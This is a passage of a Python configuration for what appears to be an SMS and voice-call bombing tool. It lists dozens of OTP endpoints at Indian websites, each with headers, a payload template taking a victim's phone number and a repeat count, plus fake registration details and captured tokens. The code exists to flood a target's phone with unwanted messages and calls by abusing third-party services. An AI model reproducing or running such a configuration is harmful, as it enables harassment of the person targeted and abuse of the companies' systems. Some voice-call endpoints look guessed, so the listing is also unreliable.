        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 3,
        "category": "sms"
    },
    
    {
        "url": "https://www.brevistay.com/cst/app-api/login",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.brevistay.com",
            "referer": "https://www.brevistay.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"is_otp": 1, "is_password": 0, "mobile": phone}),
        "count": 15,
        "category": "sms"
    },
    
    {
        "url": "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp",
        "method": "POST",
        "headers": {
            "Accept": "*/*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "Origin": "https://hourlyrooms.co.in",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 1,
        "category": "sms"
    },
    
    {
        "url": "https://api.madrasmandi.in/api/v1/auth/otp",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryBBzDmO8qIRlvPMMZ",
            "origin": "https://madrasmandi.in",
            "referer": "https://madrasmandi.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: f'------WebKitFormBoundaryBBzDmO8qIRlvPMMZ\r\nContent-Disposition: form-data; name="phone"\r\n\r\n+91{phone}\r\n------WebKitFormBoundaryBBzDmO8qIRlvPMMZ\r\nContent-Disposition: form-data; name="scope"\r\n\r\nclient\r\n------WebKitFormBoundaryBBzDmO8qIRlvPMMZ--\r\n',
        "count": 3,
        "category": "sms"
    },
    
    {
        "url": "https://www.bharatloan.com/login-sbm",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.bharatloan.com",
            "Referer": "https://www.bharatloan.com/apply-now",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: f"mobile={phone}&current_page=login&is_existing_customer=2",
        "count": 50,
        "category": "sms"
    },
    
    {
        "url": "https://api.pagarbook.com/api/v5/auth/otp/request",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://web.pagarbook.com",
            "referer": "https://web.pagarbook.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": phone, "language": 1}),
        "count": 5,
        "category": "sms"
    },
    
    {
        "url": "https://api.vahak.in/v1/u/o_w",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.vahak.in",
            "referer": "https://www.vahak.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone_number": phone, "scope": 0, "request_meta_data": "X0oLFl9sAAZzHuhTmaHk5Bbd+HFZDh+P9J6JhPghG2V1Ymi6OPEu0TH1vS2J2tc58KI/YpjG5tiqVlDkbBCMQCneV7fXtTsYRjhF8FfVNac=", "is_whatsapp": False}),
        "count": 1,
        "category": "sms"
    },
    
    {
        "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://redcliffelabs.com",
            "referer": "https://redcliffelabs.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone_number": phone, "short": True}),
        "count": 1,
        "category": "sms"
    },
    
    {
        "url": "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "apikey": "ixiweb\u00212$",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.ixigo.com",
            "referer": "https://www.ixigo.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: f"sixDigitOTP=true&token=1f94cd26e6ace46d55cb10f0f72d29a0c080a14bdfb366d3c549f5000ce0898e514f9bc240f1b66fbf3cb97b65b74665f991767172e62de48edd47e98421d270&resendOnCall=false&prefix=%2B91&resendOnWhatsapp=false&phone={phone}",
        "count": 1,
        "category": "sms"
    },
    
    {
        "url": "https://api.55clubapi.com/api/webapi/SmsVerifyCode",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://55club08.in",
            "referer": "https://55club08.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": f"91{phone}", "codeType": 1, "language": 0, "random": "35ae48f136d74b279dbd0eeb2504e7f8", "signature": "78A2879A0D46B65D257F9B29354B5DBA", "timestamp": 1715445820}),
        "count": 1,
        "category": "sms"
    },
    
    {
        "url": "https://zerodha.com/account/registration.php",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://zerodha.com",
            "referer": "https://zerodha.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile": phone, "source": "zerodha", "partner_id": ""}),
        "count": 100,
        "category": "sms"
    },
    
    {
        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.aakash.ac.in",
            "referer": "https://www.aakash.ac.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile_psid": phone, "mobile_number": "", "activity_type": "aakash-myadmission"}),
        "count": 100,
        "category": "sms"
    },
    
    {
        "url": "https://api.testbook.com/api/v2/mobile/signup?mobile=9856985698&clientId=1117490662.1715447223&sessionId=1715447223",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://testbook.com",
            "referer": "https://testbook.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile": phone, "signupDetails": {"page": "HomePage", "pagePath": "/", "pageType": "HomePage"}}),
        "count": 1,
        "category": "sms"
    },
    
    {
        "url": "https://loginprod.medibuddy.in/unified-login/user/register",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.medibuddy.in",
            "referer": "https://www.medibuddy.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"source": "medibuddyInWeb", "platform": "medibuddy", "phonenumber": phone, "flow": "Retail-Login-Home-Flow", "idealLoginFlow": False}),
        "count": 50,
        "category": "sms"
    },
    
    {
        "url": "https://api.spinny.com/api/c/user/otp-request/v3/",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.spinny.com",
            "referer": "https://www.spinny.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"contact_number": phone, "whatsapp": False, "code_len": 4, "g-recaptcha-response": "03AFcWeA46Lsb5HaQXtezpeMPCnDMfDzkpcK-Q4zgi3w8ugXsZ9WStLQWSVWgh25WKbrOY2eCyC--nleXQBQ-9s8HDrqzBM6BIMDfkNpguN6krwHF3mdRTxTBEtt5NAUV8XF6VHAe2CeU4G7Qb10qUjUtEsQt4lTCa-bka2SK0VipNsIe4zP2kygDwqB5o1SyZms7t48Ku04fQmJSEJpYpi68ZXTJi7FjVyh01JLnu7ms1juztvZ7uMwMXHt4miFYAQlX9eglyPA-PKQbV8L-ILU8Z3sthWDNs6GJhDH-rnRK-ryOOAZDN2dDJd_ab4-RNj_5e8KJOruIg9uPHckSmRtm6xUVkDNjNn1fsGiQRGrAzpBmEOwRi5IEB-qFoVEEl4hFqBOLuRF386OBlfJrMJi4Cs766kprWznF8Sms9mHhU6JZA_m4H-I8zcCh3Bs4LYIZPH2iLRBqxUbGFLK-OL3_mcCLHIf3KXBD1sOFR7yithP3zw9RKDTxNjabd95yDuPLMjZpjggHKnEJY2xKekApjxMd9PlCBgm7TtcAelz5bRzugVA_-uo8ZxFzlGGnIUfqBwiCF-3Kim010z5jQCXRh39nnqXZumIomcLmcJqr-Rb71saIzr7dk4D4jXiAaxCadFSTXTDBFBpCbg3n3m331s54Sr96Qd3dPUmYMF1cgYXjimuRlUeHTEmOQXLtfO1_quzZXTKfodooPv5Hf1guiTYX9U75Fan3nvqNYLJWNKHoxZhvQsd88F9PprWh5qMg3MXs9Qz1PAtTWQHjOZnmzUvSUNYWxUg4uaYhucG1it62ncpYZpmDonvpLQyFwLfdKMJvPjyHudVfUgwR5ZIClGZVklhkCVqecbsH8K1WuQ-T5FVeNC1G2aca-pJkqG-U_2FOslhHT6W6bsX0MKr-zKZ77m-34zEQYlLpvNC2AfVng1YQbwT9unslwfuqnf_wGLKQbU9EIWTlJ__7WfanTI-XhDRbavzVcFhFfNvPweIFzgJlfaSSsWdvhZbEJ_tKVYplQ5_HHpcCvxD15cdnYKdmyr1z9LDMOMLjmuTzqneqWLU3POHwNZ6oJ_-P9qmJsCay-GqsbF8Wt3TxmgQ_2DRvj0JwVp3Yg3GB8AtPquN331LS4CzwvWNMiiPEXKpIlS9TeWSRgEdJtS9DMFyEn6pmkO22DoEkbp59BB2PtxGxtkbVG7rBOUhWtTqqBvRy6v6WCOjn2OQEREGoJKBU702UwYDmurrNimGeQCRhmTiKX-Qy3HINJmkN6FxEZulijqyBsS7CRifx8OmURflTnzpVsnJForYAe5uLm_KsJBxvC5TgMGsmlxd5Lkf1TKcCmCCC2ldo1A8RIBZ6LAvPqgLJtTPmPmX-p6NcbGOwYHESBI_ZLVN0OhiJxbVRowq72EZH7QIJX2yKUFZts6UHk_l-VccQAGvXJrCSEIpUMpIvnBCY5UU4RnfB-pqM1UvhbIneE3JbXE03zb84yasVWrt9b0NbnaQbSHGC7OBxF9yA8zBaGC1bn4riqLBHMYWewzQ3-dHcnoB8YkaXLAs3vydK7O-HO46ciPHH78CzgJykwHrgh6At5X8cT1Rlr9yIZR-GujFw3TOhOHPK9M5HmEvmUaESbRzoGbTuwhQRSA8BMqRiwKT_6aEBSbcBpBVnloSPyNHcLCqY1W1WditMKahnMZOvf0Y_G90IzfqxWkCHfQTvGBaRaAMgZTejWRHoQfqXvwXMYs32EXklZVGmAl2lzFBMiLQ", "expected_action": "login"}),
        "count": 3,
        "category": "sms"
    },
    
    {
        "url": "https://api.tradeindia.com/home/registration/",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "multipart/form-data; boundary=----WebKitFormBoundarypzpW5AB7AKLEX4iX",
            "origin": "https://www.tradeindia.com",
            "referer": "https://www.tradeindia.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: f'------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="country_code"\r\n\r\n+91\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="phone"\r\n\r\n{phone}\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX--\r\n',
        "count": 1,
        "category": "sms"
    },
    
    {
        "url": "https://www.beyoung.in/api/sendOtp.json",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://www.beyoung.in",
            "referer": "https://www.beyoung.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"username": phone, "username_type": "mobile", "service_type": 0, "vid": "477701202435772"}),
        "count": 100,
        "category": "sms"
    },
    
    {
        "url": "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://wrogn.com",
            "referer": "https://wrogn.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"username": f"+91{phone}", "type": "mobile", "domain": "wrogn.com", "recaptcha_token": ""}),
        "count": 5,
        "category": "sms"
    },
    
    {
        "url": "https://app.medkart.in/api/v1/auth/requestOTP?uuid=f9e75a95-e172-4922-b69c-08e1e3be9f1b",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.medkart.in",
            "referer": "https://www.medkart.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile_no": phone}),
        "count": 1,
        "category": "sms"
    },
    
    {
        "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://mamaearth.in",
            "referer": "https://mamaearth.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile": phone, "referralCode": ""}),
        "count": 10,
        "category": "sms"
    },
    
    {
        "url": "https://www.coverfox.com/otp/send/",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.coverfox.com",
            "referer": "https://www.coverfox.com/user-login/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: f"csrfmiddlewaretoken=5YvA2IoBS6KRJrzV93ysh0VRRvT7CagG3DO7TPu5TwZ9161xVWsEsHzL6mYfvnIA&contact={phone}",
        "count": 5,
        "category": "sms"
    },
    
    {
        "url": "https://www.woodenstreet.com/index.php?route=account/forgotten_popup",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.woodenstreet.com",
            "referer": "https://www.woodenstreet.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: f"token=&firstname=Aartd&telephone={phone}&pincode=110086&city=NORTH+WEST+DELHI&state=DELHI&email=hdftysdrt%40gmail.com&password=%40Abvdthfuj",
        "count": 5,
        "category": "sms"
    },
    
    {
        "url": "https://gomechanic.app/api/v2/send_otp",
        "method": "POST",
        "headers": {
            "Accept": "*/*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Content-Type": "application/json",
            "Origin": "https://gomechanic.in",
            "Referer": "https://gomechanic.in/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"number": phone, "source": "website", "random_id": "K6z9b"}),
        "count": 50,
        "category": "sms"
    },
    
    {
        "url": "https://homedeliverybackend.mpaani.com/auth/send-otp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://www.lovelocal.in",
            "referer": "https://www.lovelocal.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone_number": phone, "role": "CUSTOMER"}),
        "count": 50,
        "category": "sms"
    },
    
    {
        "url": "https://www.tyreplex.com/includes/ajax/gfend.php",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.tyreplex.com",
            "Referer": "https://www.tyreplex.com/login",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: f"perform_action=sendOTP&mobile_no={phone}&action_type=order_login",
        "count": 1,
        "category": "sms"
    },
    
    {
        "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.moglix.com",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"email": "", "phone": phone, "type": "p", "source": "signup", "buildVersion": "DESKTOP-7.3", "device": "desktop"}),
        "count": 7,
        "category": "sms"
    },
    
    {
        "url": "https://oxygendigitalshop.com/graphql",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://oxygendigitalshop.com",
            "referer": "https://oxygendigitalshop.com/my-account",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"operationName": "sendRegistrationOtp", "variables": {"email_or_otp": f"+91{phone}", "isResend": False, "token": "03AFcWeA47pl14PFJtz3PaIyTLlRVG0gBdqirpf5kuLCM3Ue63bo30D5xtt3OngezeoBlB3kVH6x8AtyIRK-K6_WOXHx4W4bGNY4803bh8kpzibb2hUbjPTE780Kr1Gh7fVuZvTtsS-osUhhLAWsc3H8Fp3JFnFQi3u4gtZ_ARIQtzAUWp9p8Qt4nDsrM2fwtX9uC0SYz78n1EEXoIstjuEedvgPGsC7xqnwWBwySpW2tAGvVYIQzk6uloXuCUM9CLogsdYPt5_8G437Em9CO-I1SmQCyniCF0UDzfYGUl8pzIBSbWLzZdj4DvFkVHOHytFd6UvjqjTyuoT2RQI-KKXI9wJDGXwtbQOakjRLKE-SymDCD0k6GPQvjNJcbqhk-NMVckwSHLP3muLKQRI9EBKB4t3IjTCHoVyPMF0eLg4J5raYeukU0b0rwoOCoDs7_5uyLCc8qzIBh6LHywWirQJ-m1HvNyfsOvBX-d8_bWT7MIPKFflQfd_DnZKDyrFrRRMVQKiXeSVIRhEAZDIJul5f7Ns-t5isfYOU8-dcANSC1VJeMSPZBkXtKKvSXXYM9vtc7V59nhPyv7LU5v_wpZ2KwOHj7dybDeVr2ELZARDI1tc_NMxZy9HMrLuGhscKa1kSy29v0tpBqtU-l7vIB-1qLT-G3kxHJE4fdv9TL973FPzbEpz03wusN5YomS0hv31VhRPr-qDHBzmj-O1gyPxlEhPkNSPuiPwg"}, "query": "mutation sendRegistrationOtp($token: String!, $email_or_otp: String!, $isResend: Boolean!) {\n  sendRegistrationOtp(token: $token, value: $email_or_otp, is_resend: $isResend)\n}\n"}),
        "count": 7,
        "category": "sms"
    },
    
    {
        "url": "https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.upgrad.com",
            "referer": "https://www.upgrad.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phoneNumber": f"+91{phone}"}),
        "count": 10,
        "category": "sms"
    },
    
    {
        "url": "http://www.pinknblu.com/v1/auth/generate/otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "http://www.pinknblu.com",
            "Referer": "http://www.pinknblu.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: f"_token=HvvCsMqCY6poDB4GYPd2DJxewZ6H6TWPMHt8hfEV&country_code=%2B91&phone={phone}",
        "count": 50,
        "category": "sms"
    },
    
    {
        "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-IN",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "origin": "https://auth.udaan.com",
            "referer": "https://auth.udaan.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: f"mobile={phone}",
        "count": 3,
        "category": "sms"
    },
    
    {
        "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
        "method": "POST",
        "headers": {
            "Authorization": "Bearer",
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Referer": "https://www.xylem.live/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile": phone, "countryCode": "+91", "firstName": "Anant Ambani"}),
        "count": 50,
        "category": "sms"
    },
    
    {
        "url": "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.nobroker.in",
            "referer": "https://www.nobroker.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: f"phone=%2B91{phone}",
        "count": 50,
        "category": "sms"
    },
    
    {
        "url": "https://vidyakul.com/signup-otp/send",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://vidyakul.com",
            "referer": "https://vidyakul.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: f"phone={phone}",
        "count": 3,
        "category": "sms"
    },
    
    {
        "url": "https://api.woodenstreet.com/api/v1/register",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://www.woodenstreet.com",
            "referer": "https://www.woodenstreet.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"firstname": "Astres", "email": "abcdhbdgud77dd@gmail.com", "telephone": phone, "password": "abcd@gmail.com#%fd", "isGuest": 0, "pincode": "110001", "lastname": "", "customer_id": ""}),
        "count": 200,
        "category": "sms"
    }
]

# =============== VOICE CALL APIS (12 APIs) ===============
VOICE_APIS = [
    {
        "name": "Tata Capital Voice Call",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}',
        "count": 5,
        "category": "voice"
    },
    {
        "name": "1MG Voice Call",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}',
        "count": 5,
        "category": "voice"
    },
    {
        "name": "Swiggy Call Verification",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 5,
        "category": "voice"
    },
    {
        "name": "Myntra Voice Call",
        "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 5,
        "category": "voice"
    },
    {
        "name": "Flipkart Voice Call",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 5,
        "category": "voice"
    },
    {
        "name": "Amazon Voice Call",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&action=voice_otp",
        "count": 5,
        "category": "voice"
    },
    {
        "name": "Paytm Voice Call",
        "url": "https://accounts.paytm.com/signin/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 5,
        "category": "voice"
    },
    {
        "name": "Zomato Voice Call",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&type=voice",
        "count": 5,
        "category": "voice"
    },
    {
        "name": "MakeMyTrip Voice Call",
        "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 5,
        "category": "voice"
    },
    {
        "name": "Goibibo Voice Call",
        "url": "https://www.goibibo.com/user/voice-otp/generate/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 5,
        "category": "voice"
    },
    {
        "name": "Ola Voice Call",
        "url": "https://api.olacabs.com/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 5,
        "category": "voice"
    },
    {
        "name": "Uber Voice Call",
        "url": "https://auth.uber.com/v2/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 5,
